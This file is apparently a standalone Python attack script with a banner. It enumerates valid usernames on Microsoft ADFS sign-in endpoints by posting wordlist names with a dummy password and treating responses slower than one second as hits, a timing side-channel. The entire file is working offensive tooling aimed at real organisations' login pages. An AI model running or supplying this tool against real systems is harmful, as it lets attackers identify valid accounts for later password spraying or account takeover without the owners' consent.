from re import X
import time, os, sys
from termcolor import colored 
import argparse
import requests

def main():
    print(" ")
print(colored("                                   _  ___             ", "red", attrs=['bold']))
print(colored("                         _ __ ___ / |/ _ \  ___       ", "red", attrs=['bold']))
print(colored("                        | '_ ` _ \| | (_) |/ _ \      ", "red", attrs=['bold']))
print(colored("                        | | | | | | |\__, | (_) |     ", "red", attrs=['bold']))
print(colored("                        |_| |_| |_|_|  /_/ \___/      ", "red", attrs=['bold']))
print("")

sess = requests.session()

def parse_args():
        parser = argparse.ArgumentParser(description='Process some integers.')
        parser.add_argument('-t', '--target', help='Type your targeted url')
        parser.add_argument('-w', '--wordlist', help='Username wordlist',required=True)
        parser.add_argument('-d', '--domain', help='Type your targeted domain', required=True)
        parser.add_argument('-l', '--list', help='Choose your target list')
        return parser.parse_args()

def attacktarget(target,wordlist,domain) :
        sess.post(f'{target}/adfs/ls/idpinitiatedsignon.aspx',data={"SignInIdpSite":"SignInIdpSite","SignInSubmit":"Sign+in","SingleSignOut":"SingleSignOut"}) # for first cookie
        with open(wordlist, 'r') as f :
            for username in f:
             url = f'{target}/adfs/ls/idpinitiatedsignon.aspx'
             username = str(username.strip()) + "@" + domain
             data = {"UserName":username,"Password":"asd","AuthMethod":"FormsAuthentication"}
             #print(data)
             response = sess.post(url, data=data)
             if response.elapsed.total_seconds() > 1 :
                print("username:" + username,"-" + " " + "is valid", response.elapsed.total_seconds())  
             else :
                print("username:" + username,"-" + " " + "is not valid", response.elapsed.total_seconds()) 

def interactive():
    args = parse_args()
    target = args.target
    wordlist = args.wordlist
    domain = args.domain
    list = args.list
    attacktarget(target,wordlist,domain)


if __name__ == "__main__":
    interactive()